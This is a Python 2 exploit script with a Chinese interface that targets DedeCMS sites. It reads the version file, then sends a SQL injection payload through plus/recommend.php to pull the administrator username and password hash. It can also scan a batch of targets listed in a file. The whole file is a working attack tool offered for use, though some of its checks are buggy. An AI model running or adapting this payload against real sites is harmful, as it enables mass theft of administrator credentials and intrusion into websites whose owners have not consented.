#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2020/6/25 23:18
# @Author  : Shadow
# @Site    : 
# @File    : dedeCMS_exp.py
# @Software: PyCharm


import re
import urllib2

print ('''
 ======================================================= 
|                  dedeCMS漏洞利用程序                    |
|                    By：1匹黑马                         |
|        Blog：https://blog.csdn.net/qq_43573676        |
 =======================================================
''')


def dedecms_version(host):
    if host.startswith('http'):
        host = (host+exp2)
    else:
        host = 'http://'+(host+exp2)

    try:
        html = urllib2.urlopen(host).read()
        if html in re.findall(r'\d*',html):
            version = re.findall(r'\d*',html)
            print '当前版本号为：%s'%version[0]

    except urllib2.HTTPError:
        print '%s该网站已删除或隐藏版本文件！'%host


def dedecms_exp(host):
    if host.startswith('http'):
        host = host
    else:
        host = 'http://'+host
    try:
        html = urllib2.urlopen(host+exp1).read()
        username = re.findall(r'\|(.*)\|',html)
        password = re.findall(r'\|(\w*)',html)

        if username is True and password is True:
            username = username
            password = password
            print'''
            =========================================
            | 账号：%s                            |
            | 密码：%s |
            =========================================
            ''' % (username[0], password[3:-1])
        else:
            print host+'已修复或不存在该漏洞！\n'
    except urllib2.HTTPError:
        print host+'已修复或不存在该漏洞!\n'


if __name__=='__main__':

    exp1 = r"/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
    exp2 = r"/data/admin/ver.txt"

    chose = raw_input('请选择单一检测或者批量检测（u or t）：')
    if chose == 'u':
        url = raw_input('请输入目标网址：')
        print '==========================请稍候============================\n'
        dedecms_version(url.strip("\n"))
        dedecms_exp(url.strip("\n"))
    elif chose == 't':
        urls = raw_input('请指定目录文件：')
        print '============================请稍候============================\n'
        with open(urls) as file:
            for host in file:
                dedecms_version(host.strip("\n")),
                dedecms_exp(host.strip("\n")),
    else:
        print '您的输入有误，请检查后重新输入！'
    print '\n========================检测已结束=========================='